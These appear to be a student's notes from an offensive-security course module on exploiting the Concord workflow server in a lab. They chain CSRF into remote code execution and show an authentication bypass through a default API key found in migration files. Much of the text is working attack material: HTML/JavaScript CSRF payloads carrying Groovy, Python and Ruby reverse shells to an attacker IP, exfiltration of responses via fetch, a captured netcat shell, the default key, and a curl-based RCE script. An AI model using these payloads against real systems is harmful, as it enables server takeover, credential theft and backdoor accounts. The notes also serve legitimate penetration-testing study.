We again provide Kali’s IP address to the user simulator. After the simulation runs, we should see a new log entry in the HTTP server logs.
```
192.168.121.253 - - [07/Apr/2021 20:27:25] "GET / HTTP/1.1" 200 -
192.168.121.253 - - [07/Apr/2021 20:27:25] "GET /?msg={%20%20%22realm%22%20:%20%22apikey%22,%20%20%22username%22%20:%20%22concordAgent%22,%20%20%22displayName%22%20:%20%22concordAgent%22} HTTP/1.1" 200 -
192.168.121.253 - - [07/Apr/2021 20:27:25] "GET /?msg={%20%20%22instanceId%22%20:%20%22a85f6fef-69cb-4127-975c-9aa97584415e%22,%20%20%22ok%22%20:%20true} HTTP/1.1" 200 -
```

This new log entry contains the response that the victim’s browser received when it created the new process.

Our listener should also show that we caught a shell:
```
kali@kali:~$ nc -nvlp 9000
listening on [any] 9000 ...
connect to [192.168.118.2] from (UNKNOWN) [192.168.120.132] 39888
whoami
concord

ls -alh
total 28K
drwxr-xr-x 4 concord concord 4.0K Apr  8 00:27 .
drwx------ 3 concord concord 4.0K Apr  8 00:27 ..
drwxr-xr-x 2 concord concord 4.0K Apr  8 00:27 .concord
drwxr-xr-x 3 concord concord 4.0K Apr  8 00:27 _attachments
-rw-r--r-- 1 concord concord   36 Apr  8 00:27 _instanceId
-rw-r--r-- 1 concord concord  978 Apr  8 00:27 _main.json
-rw-r--r-- 1 concord concord  956 Apr  8 00:27 concord.yml
```


#### Exercises

1. We omitted some important options in the `rce` function that are required for the payload to work correctly. Fix the payload so it includes the appropriate `fetch` options.
``` js
<html>
	<head>
        <script>
                yml = `
configuration:
  dependencies:
  - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.2"
flows:
  default:
    - script: groovy
      body: |
         String host = "192.168.45.203";
         int port = 9000;
         String cmd = "/bin/sh";
         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
         Socket s = new Socket(host, port);
         InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
         OutputStream po = p.getOutputStream(), so = s.getOutputStream();
         while (!s.isClosed()) {
         while (pi.available() > 0) so.write(pi.read());
         while (pe.available() > 0) so.write(pe.read());
         while (si.available() > 0) po.write(si.read());
         so.flush();
         po.flush();
         Thread.sleep(50);
         try {
            p.exitValue();
            break;
         } catch (Exception e) {}
         };
         p.destroy();
         s.close();
`


        fetch("http://concord:8001/api/service/console/whoami", {
            credentials: 'include'
        })
        .then(async (response) => {
            if(response.status != 401){
                let data = await response.text();
                fetch("http://192.168.45.203/?msg=" + data )
            }else{
                fetch("http://192.168.45.203/?msg=UserNotLoggedIn" )
            }
        })

        function rce() {
            var ymlBlob = new Blob([yml], { type: "application/yml" });
            var fd = new FormData();
            fd.append('concord.yml', ymlBlob);
            fetch("http://concord:8001/api/v1/process", {
                credentials: 'include',
                method: 'POST',
                body: fd
            })
            .then(response => response.text())
            .then(data => {
                fetch("http://192.168.45.203/?msg=" + data )
            }).catch(err => {
                fetch("http://192.168.45.203/?err=" + err )
            });
            }
        rce();


        </script>
	</head>
	<body>
	</body>
</html>


```

2. Add content to the HTML so the page looks more legitimate.
3. Build the payload in Python.
``` js
<html>
	<head>
        <script>
                yml = `
configuration:
  dependencies:
    - "mvn://org.python:jython-standalone:2.7.0"

flows:
  default:
    - script: python
      body: |
        import subprocess

        cmd = "bash -c 'bash -i >& /dev/tcp/192.168.45.203/4444 0>&1'"
        subprocess.Popen(cmd, shell=True)
`;

        fetch("http://concord:8001/api/service/console/whoami", {
            credentials: 'include'
        })
        .then(async (response) => {
            if(response.status != 401){
                let data = await response.text();
                fetch("http://192.168.45.203/?msg=" + data )
            }else{
                fetch("http://192.168.45.203/?msg=UserNotLoggedIn" )
            }
        })

        function rce() {
            var ymlBlob = new Blob([yml], { type: "application/yml" });
            var fd = new FormData();
            fd.append('concord.yml', ymlBlob);
            fetch("http://concord:8001/api/v1/process", {
                credentials: 'include',
                method: 'POST',
                body: fd
            })
            .then(response => response.text())
            .then(data => {
                fetch("http://192.168.45.203/?msg=" + data )
            }).catch(err => {
                fetch("http://192.168.45.203/?err=" + err )
            });
            }
        rce();


        </script>
	</head>
	<body>
	</body>
</html>

```


4. Build the payload in Ruby.
``` js
                yml = `
configuration:
  dependencies:
  - "mvn://org.jruby:jruby:9.1.13.0"

flows:
  default:
  - script: ruby
    body: |
      cmd = "bash -i >& /dev/tcp/192.168.45.203/4444 0>&1"
      pid = Process.spawn("/bin/bash", "-c", cmd)
      Process.wait(pid)
`;
```
#### Extra Mile

1. Use the shell to add a new user to Concord and authenticate as that new user.
    
2. The version of Concord we are currently using is vulnerable to permissive CORS. As mentioned earlier, exploiting a CSRF vulnerability does not require permissive CORS headers. Connect to the Concord server via SSH and run the following commands to stop the old version of Concord and start the new one.


# 8.3 Authentication Bypass: Round Two Unsafe Defaults


So far, we have demonstrated the power of CSRF and how it can lead to remote code execution. Because of updates in modern browsers, CSRF vulnerabilities are becoming less practical to exploit, so we must look for other authentication bypass vulnerabilities. Fortunately, Concord’s default installation and configuration are insecure, which results in authentication bypass.

Although the version of Concord we are currently using also contains the insecure-default vulnerability that we will discuss shortly, we will focus on a newer version to prove that it suffers from the same issue. Let us download the code to the Kali VM and start the newer version of the application. We will use `rsync` to download the code with the `-az` options so it is transferred as a compressed archive. We must also provide the username and hostname (`student@concord`), the source path (`/home/student/concord-1.83.0/`), and the destination path (`concord/`).

```
kali@kali:~$ rsync -az student@concord:/home/student/concord-1.83.0/ concord/
student@concord's password: 
```

While the code is downloading, we connect to the Concord server over SSH, stop the old version, and then start the new version. Concord uses [_Docker_](https://www.docker.com/) to run the application, so we can use the `docker-compose` command to stop and start it.

First, we use the `down` command to stop the old application, providing the appropriate `docker-compose` file with `-f`.
```
kali@kali:~/concord$ ssh student@concord
student@concord's password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)
...

student@concord:~$ sudo docker-compose -f concord-1.43.0/docker-compose.yml down
[sudo] password for student: 
Stopping concord1430_concord-agent_1  ... done
Stopping concord1430_concord-server_1 ... done
Stopping concord1430_concord-dind_1   ... done
Stopping concord1430_concord-db_1     ... done
Removing concord1430_concord-agent_1  ... done
Removing concord1430_concord-server_1 ... done
Removing concord1430_concord-dind_1   ... done
Removing concord1430_concord-db_1     ... done
Removing network concord1430_concord
```

Next, we start the new version, this time using the `docker-compose.yml` file in the `concord-1.83.0` directory. We use the `up` command and add the `-d` option so `docker-compose` runs in the background.

```
student@concord:~$ sudo docker-compose -f concord-1.83.0/docker-compose.yml up -d
Creating network "concord1830_concord" with the default driver
Creating concord1830_concord-dind_1 ... 
Creating concord1830_concord-db_1 ... 
Creating concord1830_concord-dind_1
Creating concord1830_concord-db_1 ... done
Creating concord1830_concord-server_1 ... 
Creating concord1830_concord-server_1 ... done
Creating concord1830_concord-agent_1 ... 
Creating concord1830_concord-agent_1 ... done
student@concord:~$ 
```

At this point, we should be running the newer version of Concord. We will begin by reviewing the code to discover the vulnerability. More specifically, we will review the application startup and installation process. This process begins with the `start.sh` file in the `server/dist/src/assembly/` directory.

```
kali@kali:~/concord$ cat server/dist/src/assembly/start.sh
#!/bin/bash

BASE_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

MAIN_CLASS="com.walmartlabs.concord.server.dist.Main"
if [[ "${CONCORD_COMMAND}" = "migrateDb" ]]; then
    MAIN_CLASS="com.walmartlabs.concord.server.MigrateDB"
fi

...

exec java \
${CONCORD_JAVA_OPTS} \
-Dfile.encoding=UTF-8 \
-Djava.net.preferIPv4Stack=true \
-Djava.security.egd=file:/dev/./urandom \
-Dollie.conf=${CONCORD_CFG_FILE} \
-cp "${BASE_DIR}/lib/*:${BASE_DIR}/ext/*:${BASE_DIR}/classes" \
"${MAIN_CLASS}"
```

While reviewing this file, we discover that the application runs the class defined in the `MAIN_CLASS` variable. This variable can be set either to the `Main` class in `com.walmartlabs.concord.server.dist` or to the `MigrateDb` class in `com.walmartlabs.concord.server`. Database migrations are used to initialize the application or update the application database to the current version. They may create tables, add columns, and insert data.

It is always a good habit to periodically review database migration files to understand the database layout. In addition, applications sometimes leave sensitive data behind in these migration files during development.

When we search the codebase for `MigrateDB`, we find the class declaration in `server/impl/src/main/java/com/walmartlabs/concord/server/MigrateDB.java`.

```
public class MigrateDB {

    @Inject
    @MainDB
    private DataSource dataSource;

    public static void main(String[] args) throws Exception {
        EnvironmentSelector environmentSelector = new EnvironmentSelector();
        Config cfg = new ConfigurationProcessor("concord-server", environmentSelector.select()).process();

        Injector injector = Guice.createInjector(
                new WireModule(
                        new SpaceModule(new URLClassSpace(MigrateDB.class.getClassLoader()), BeanScanning.CACHE),
                        new OllieConfigurationModule("com.walmartlabs.concord.server", cfg),
                        new DatabaseModule()));

        new MigrateDB().run(injector);
    }
...
}
```

After reviewing this file, we notice that one of the referenced classes is `DatabaseModule`, located under `server/db/src/main/java/com/walmartlabs/concord/db`. The `com/walmartlabs/concord/db` portion of the path represents the class path. Normally, such subpaths do not contain many files, but because there is a folder named `db`, we can infer that it is used to manage the database. Next, we navigate to the root of this folder (`server/db/src/main/`) and inspect its directory structure.

``` d
kali@kali:~/concord$ cd server/db/src/main/

kali@kali:~/concord/server/db/src/main$ tree
.
├── java
│   └── com
│       └── walmartlabs
│           └── concord
│               └── db
│                   ├── AbstractDao.java
│                   ├── DatabaseChangeLogProvider.java
...
└── resources
    └── com
        └── walmartlabs
            └── concord
                └── server
                    └── db
                        ├── liquibase.xml
                        ├── v0.0.1.xml
                        ├── v0.12.0.xml
...
```


The directory structure shows that the `java` directory contains code, while the `resources` directory contains various XML documents, including `liquibase.xml`. A quick online search shows the following information about this file:
```
Liquibase is an open-source database schema change management solution that enables you to manage database change versions easily.
```
These must be database migrations containing table names, column names, and data definitions.

Let us review the `v0.0.1.xml` file to become familiar with its format.
```
<?xml version="1.0" encoding="UTF-8"?>
<databaseChangeLog
        xmlns="http://www.liquibase.org/xml/ns/dbchangelog"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://www.liquibase.org/xml/ns/dbchangelog http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-3.3.xsd">
...
    <!-- USERS -->

    <changeSet id="1200" author="ibodrov@gmail.com">
        <createTable tableName="USERS" remarks="Users">
            <column name="USER_ID" type="varchar(36)" remarks="Unique user ID">
                <constraints primaryKey="true" nullable="false"/>
            </column>
            <column name="USERNAME" type="varchar(64)" remarks="Unique name of a user (login)">
                <constraints unique="true" nullable="false"/>
            </column>
        </createTable>
    </changeSet>

...
</databaseChangeLog>
```

This database migration shows the creation of the `USERS` table, which contains two columns: _USER_ID_ and _USERNAME_. This may not reflect the current state of the `USERS` table, because later migrations may have added, removed, or renamed columns. Still, it gives us insight into the contents of the database.

Searching further in the same file, we find a database insert statement that catches our attention.
```
    <changeSet id="1440" author="ibodrov@gmail.com">
        <insert tableName="API_KEYS">
            <column name="KEY_ID">d5165ca8-e8de-11e6-9bf5-136b5db23c32</column>
            <!-- original: auBy4eDWrKWsyhiDp3AQiw -->
            <column name="API_KEY">KLI+ltQThpx6RQrOc2nDBaM/8tDyVGDw+UVYMXDrqaA</column>
            <column name="USER_ID">230c5c9c-d9a7-11e6-bcfd-bb681c07b26c</column>
        </insert>
    </changeSet>
```

This record inserts an API key into the database. Earlier, we learned from the documentation that the `Authorization` header can be used to authenticate with an API key. Let us try authenticating a request with `curl`. We will use the value from the `API_KEY` column as the `Authorization` header, specified with the `-H` flag. We will also use `-i` to display the response headers.
```d
kali@kali:~$ curl -i -H "Authorization: KLI+ltQThpx6RQrOc2nDBaM/8tDyVGDw+UVYMXDrqaA" http://concord:8001/api/v1/apikey
HTTP/1.1 401 Unauthorized
Date: Fri, 09 Apr 2021 19:44:41 GMT
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: *
Access-Control-Allow-Headers: Authorization, Content-Type, Range, Cookie, Origin
Access-Control-Expose-Headers: cache-control,content-language,expires,last-modified,content-range,content-length,accept-ranges
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
Set-Cookie: rememberMe=deleteMe; Path=/; Max-Age=0; Expires=Thu, 08-Apr-2021 19:44:41 GMT
Content-Length: 0
Server: Jetty(9.4.26.v20200117)
```

Unfortunately, the response returns a _401 Unauthorized_ error. However, API keys should be treated like passwords and hashed before being stored. Concord’s developers mistakenly left an "original" value (`auBy4eDWrKWsyhiDp3AQiw`) in the comment above the entry. Let us try authenticating with `curl` using that value.
```
kali@kali:~$ curl -i -H "Authorization: auBy4eDWrKWsyhiDp3AQiw" http://concord:8001/api/v1/apikey
HTTP/1.1 401 Unauthorized
Date: Fri, 09 Apr 2021 20:06:37 GMT
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: *
Access-Control-Allow-Headers: Authorization, Content-Type, Range, Cookie, Origin
Access-Control-Expose-Headers: cache-control,content-language,expires,last-modified,content-range,content-length,accept-ranges
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
Set-Cookie: rememberMe=deleteMe; Path=/; Max-Age=0; Expires=Thu, 08-Apr-2021 20:06:37 GMT
Content-Length: 0
Server: Jetty(9.4.26.v20200117)
```


This request also returns an "Unauthorized" response. Given that this was the very first migration, it would not be surprising if the data had changed later. Other migrations may have removed or moved this entry. Let us use `grep` to search for `<insert tableName="API_KEYS">` to determine whether other migrations also inserted values into this table.

```
kali@kali:~/concord$ grep -rl '<insert tableName="API_KEYS">' ./
./server/db/src/main/resources/com/walmartlabs/concord/server/db/v0.70.0.xml
./server/db/src/main/resources/com/walmartlabs/concord/server/db/v0.69.0.xml
./server/db/src/main/resources/com/walmartlabs/concord/server/db/v0.0.1.xml
```

Searching for that string returns three results. We have already reviewed `v0.0.1.xml`, so next let us review `v0.69.0.xml`.
```
<?xml version="1.0" encoding="UTF-8"?>
...
    <property name="concordAgentUserId" value="d4f123c1-f8d4-40b2-8a12-b8947b9ce2d8"/>

    <changeSet id="69000" author="ybrigo@gmail.com">
        <insert tableName="USERS">
            <column name="USER_ID">${concordAgentUserId}</column>
            <column name="USERNAME">concordAgent</column>
            <column name="USER_TYPE">LOCAL</column>
        </insert>
        
        <insert tableName="API_KEYS">
            <!-- "O+JMYwBsU797EKtlRQYu+Q" -->
            <column name="API_KEY">1sw9eLZ41EOK4w/iV3jFnn6cqeAMeFtxfazqVY04koY</column>
            <column name="USER_ID">${concordAgentUserId}</column>
        </insert>
    </changeSet>

</databaseChangeLog>
```

In this migration, we find that an `API_KEYS` entry is inserted for the `concordAgent` user. Since this migration occurred 68 versions later than the previous one, that value is quite likely to still exist in the database. Let us try using `curl` to access this API key. This time, we will use the commented value above the entry.

```
kali@kali:~/concord$ curl -H "Authorization: O+JMYwBsU797EKtlRQYu+Q" http://concord:8001/api/v1/apikey
[ {
  "id" : "4805382e-98bc-11eb-a54f-0242ac140003",
  "userId" : "d4f123c1-f8d4-40b2-8a12-b8947b9ce2d8",
  "name" : "key-1"
} ]
```

Excellent. We successfully found a default user account that developers mistakenly left in place and did not regenerate during installation.

The Concord documentation notes that we can use API token login by appending `?useApiKey=true` to the login URL.
![[Pasted image 20260725102332.png]]

![[Pasted image 20260725102338.png]]

#### Exercises

1. Try using the first API key in Concord 1.43.0. Why does it not work in 1.83.0?
Because in `1.45.0.xml`, that `API_KEYS` entry was already deleted.
- **1.43.0**: It had not yet gone through the 1.45.0 migration, so the first default API key from `v0.0.1.xml` still existed and was usable.
- **1.83.0**: The old key had been removed from `API_KEYS`; the original value in the source code comment is only a historical leftover and no longer maps to a valid credential in the database, so it returns `401 Unauthorized`.
![[Pasted image 20260725125553.png]]

2. Explain how Concord hashes API keys before storing them.
```
Original token
  → Base64 decode
  → SHA-256
  → Base64 encode without padding
  → Write to API_KEYS.API_KEY
```

3. Review the `v0.70.0.xml` file and identify all newly added entries.
```
Gz0q/DeGlH8Zs7QJMj1v8g
```
![[Pasted image 20260725125859.png]]

4. Use the newly discovered API key to obtain RCE with a `curl` request.

```
export CONCORD_LAB_KEY='O+JMYwBsU797EKtlRQYu+Q'
curl -i \
  -H "Authorization: ${CONCORD_LAB_KEY}" \
  -F "concord.yml=@concord.yml;type=application/octet-stream" \
  http://concord:8001/api/v1/process
  
```
`/api/v1/process` is specifically designed to accept workflow-file uploads as `multipart/form-data`, and `curl -F` is exactly how we construct that type of HTTP request.

It can be broken down into three parts:
- `concord.yml` on the left: the multipart field name. Concord recognizes this name and treats it as the workflow definition file.
- `concord.yml`: tells `curl` to read the local file `concord.yml` from the current Kali directory and place its contents in the request body.
- `type=application/octet-stream`: explicitly marks this as binary file content to avoid it being treated as a normal text parameter.

`-F` automatically:
- uses `POST`;
- sets `Content-Type: multipart/form-data; boundary=...`;
- uploads the file as one multipart part.
After the server receives it, it saves the multipart part named `concord.yml` into the new process working directory and parses and executes it as the default workflow.

5. In the course Wiki VM, we provide an encrypted value. That value was encrypted using the OffSec organization and the AWAE project in Concord 1.43.0. Use the Concord process to decrypt the value.

#### Extra Effort

Because CORS requests allow the `Authorization` header, even if we cannot access the application directly over the network, we can still send authenticated requests through the user’s browser. Return to the older version of Concord and create a CORS payload using the `Authorization` header and the credentials we discovered. The payload should create a new administrator user, generate a new API key as a backdoor, and obtain shell access.






# Summary

Remote code execution vulnerabilities in workflow servers can be devastating to an organization. If the workflow server acts as the central repository across all application environments, that server likely contains passwords, keys, and other secrets that could lead to complete compromise of enterprise systems.

As browser security continues to improve, exploiting CSRF and session-hijacking vulnerabilities also becomes more difficult. However, attackers can still abuse these issues because organizations often update browsers slowly, if at all, or because they deploy overly permissive CORS headers that weaken the browser’s default protection mechanisms. As this module demonstrated, multiple vulnerabilities can be chained together into a reliable CSRF attack.

In this module, we showed that even if browsers completely eliminate CSRF vulnerabilities, applications may still contain multiple authentication-bypass vulnerabilities. Supporting files, such as migration files, can reveal a large amount of information about an application or, as in Concord’s case, even contain default credentials that provide access to the application.


# RCE Script


``` python
import requests
import subprocess, os
#export CONCORD_LAB_KEY='O+JMYwBsU797EKtlRQYu+Q'
#curl -i \
#  -H "Authorization: ${CONCORD_LAB_KEY}" \
#  -F "concord.yml=@concord.yml;type=application/octet-stream" \



if __name__ == '__main__':
    print("Start working")
    
    proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
	}

    url = f"http://concord:8001/api/v1/process"

    api_key = 'O+JMYwBsU797EKtlRQYu+Q'

    result = subprocess.run(
    [
        "curl",
        "-i",
        "-H", f"Authorization: {api_key}",
        "-F", "concord.yml=@concord.yml;type=application/octet-stream",
        url,
    ],
    text=True,
    capture_output=True,
    check=True,
    )

    print(result.stdout)

```
